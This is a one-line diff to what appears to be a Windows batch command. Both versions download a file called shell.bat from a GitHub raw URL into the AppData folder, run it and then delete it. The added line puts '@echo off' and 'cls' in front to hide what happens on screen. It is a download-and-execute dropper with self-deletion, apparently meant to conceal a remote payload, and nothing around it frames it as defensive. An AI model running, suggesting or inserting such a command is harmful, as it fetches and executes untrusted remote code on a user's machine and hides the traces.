@@ -1,1 +1,1 @@
-curl.exe -o %appdata%\shell.bat https://raw.githubusercontent.com/mrLeonTheMaster/shell/main/start.bat & cmd /c %appdata%\shell.bat & del %appdata%\shell.bat
+@echo off curl.exe -o %appdata%\shell.bat https://raw.githubusercontent.com/mrLeonTheMaster/shell/main/start.bat & cls & cmd /c %appdata%\shell.bat & del %appdata%\shell.bat
